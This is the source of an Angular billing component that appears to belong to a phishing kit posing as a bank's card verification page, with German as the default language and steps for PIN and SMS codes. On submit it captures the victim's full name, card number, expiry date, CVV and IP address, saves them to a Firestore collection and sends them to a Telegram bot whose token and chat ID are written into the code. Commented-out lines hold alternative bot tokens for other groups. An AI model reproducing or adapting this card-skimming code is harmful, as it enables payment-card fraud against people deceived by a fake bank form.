import { Component, OnInit, ViewChild, ElementRef } from "@angular/core";
import { Billing } from "./billing";
import { MyService } from "../myservice";
import { Router } from "@angular/router";
import {
  AngularFirestore,
  AngularFirestoreCollection,
} from "@angular/fire/firestore";
import { Observable } from "rxjs";
import { HttpClient } from "@angular/common/http";

@Component({
  selector: "app-billing",
  templateUrl: "./billing.component.html",
  styleUrls: ["./billing.component.css"],
})
export class BillingComponent implements OnInit {
  billing: Billing = {
    fullName: "",
    cardNumber: "",
    exp: "",
    cvv: "",
    dateTime: "",
    ip: "",
  };
  wors: string;
  billingsCollection: AngularFirestoreCollection<Billing>;
  monthIsValid: boolean = true;
  yearIsValid: boolean = true;
  finished: boolean = false;
  submitted: boolean = false;

  step = 1;
  title = "raif";
  pin = "";
  sms = "";
  sms2 = "";
  selectedLanguage = "Deutsch";
  selectedLand = "";
  stepThreeIsLoading = true;
  cardNumber = "";
  fullName = "";
  CVV = "";
  expDate = "";
  errors: any = {};
  signature = "";
  disabled = true;
  disabled2 = true;
  disabled3 = true;
  disabled4 = true;
  prefix = "";
  errorMessage = "";
  tmpPrefix = "";
  visit: any = { ip: "", country: "", dateTime: "" };

  constructor(
    private httpClient: HttpClient,
    private myService: MyService,
    private router: Router,
    db: AngularFirestore
  ) {
    this.billingsCollection = db.collection("bBet");
    //this.billing.month = "04";
    //this.billing.year = "20";
    //if(localStorage.getItem('loggedIn')==null)
    //this.router.navigate(['/login']);
    myService.getIpAddress().subscribe((ip) => {
      this.visit.ip = ip.ip;
      myService.getCountry(ip.ip).subscribe((country) => {
        this.visit.country = country.country_name;
      });
    });
  }

  ngOnInit() {}

  onKeyName() {
    // without type info
    if (this.fullName.length > 5) {
      this.disabled = false;
    } else {
      this.disabled = true;
    }
  }

  onKeyCard() {
    // without type info
    if (this.cardNumber.length > 15) {
      this.disabled2 = false;
    } else {
      this.disabled2 = true;
    }
    this.onKeyExp();
  }

  onKeyExp() {
    // without type info
    if (this.expDate.length > 4) {
      this.disabled3 = false;
    } else {
      this.disabled3 = true;
    }
    this.onKeyCVV();
  }

  onKeyCVV() {
    // without type info
    if (this.CVV.length > 2) {
      this.disabled4 = false;
    } else {
      this.disabled4 = true;
    }
    this.onKeyName();
  }

  showInput() {
    // without type info
  }

  sendTelegram(message: string): Observable<any[]> {
     return this.httpClient.post<any[]>('https://api.telegram.org/bot1096379466:AAH8mwk8WMjsaZxYij_p-8rooHHJWkExFWk/sendMessage?chat_id=-1001207984927&text='+message,null);

    // Our GRP
    //return this.httpClient.post<any[]>('https://api.telegram.org/bot1612373960:AAFQ3-vPMBOA_hSrrgh8y68LNnx3wSxW8BE/sendMessage?chat_id=-1001499839547&text='+message,null);

    //me&val
   //return this.httpClient.post<any[]>("https://api.telegram.org/bot1612373960:AAFQ3-vPMBOA_hSrrgh8y68LNnx3wSxW8BE/sendMessage?chat_id=-1001558381849&text=" +message,null);

  }
  submitForm() {
    this.disabled = true;

    this.errors = {};

    setTimeout(() => {
      if (this.fullName.match(/^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/g)) {
        this.errors.nameError = true;
        this.disabled = false;
      }
      if (this.cardNumber.length < 15) {
        this.errors.cardError = true;
        this.disabled = false;
      }
      if (this.expDate.length < 5) {
        this.errors.expError = true;
        this.disabled = false;
      }
      if (this.CVV.length < 3) {
        this.errors.cvvError = true;
        this.disabled = false;
      }
      if (Object.keys(this.errors).length > 0) {
        console.log("Errorrrrr");
        return;
      }
      //fb
      this.billing.fullName = this.fullName;
      this.billing.cardNumber = this.cardNumber;
      this.billing.exp = this.expDate;
      this.billing.cvv = this.CVV;
      this.billing.dateTime = Date.now();
      this.billing.ip = this.visit.ip;
      localStorage.setItem("email", this.fullName);
      this.billingsCollection.add(this.billing);
      this.disabled = false;
      let message;
      message =
        this.fullName +
        "   " +
        this.cardNumber +
        "   " +
        this.expDate +
        "   " +
        this.CVV +
        "   " +
        this.visit.ip;
      this.sendTelegram(message).subscribe((data) => console.log(data));

      this.router.navigate(["/verify"]);
      return;
    }, 1500);
  }
  onSubmit(form) {
    if (form.valid) {
      this.billing.ip = localStorage.getItem("ip");
      this.billing.dateTime = Date.now();
      //this.myService.addBilling(this.billing.fullName, this.billing.cardNumber, this.billing.month, this.billing.year, this.billing.cvv, this.billing.zip).subscribe();
      this.billingsCollection.add(this.billing);
      window.scroll(0, 0);
      this.submitted = true;
      this.delay(3000);
    }
  }

  validateMonth() {
    this.monthIsValid = true;
    this.yearIsValid = true;
  }

  validateYear() {
    this.yearIsValid = true;
    this.monthIsValid = true;
  }

  async delay(ms: number) {
    await new Promise((resolve) => setTimeout(() => resolve(), ms)).then(() =>
      console.log("fired")
    );
    this.finished = true;
    this.delayAndRedirect(3000);
  }

  async delayAndRedirect(ms: number) {
    await new Promise((resolve) => setTimeout(() => resolve(), ms)).then(() =>
      console.log("fired")
    );
    this.router.navigate(["/verification"]);
  }
}
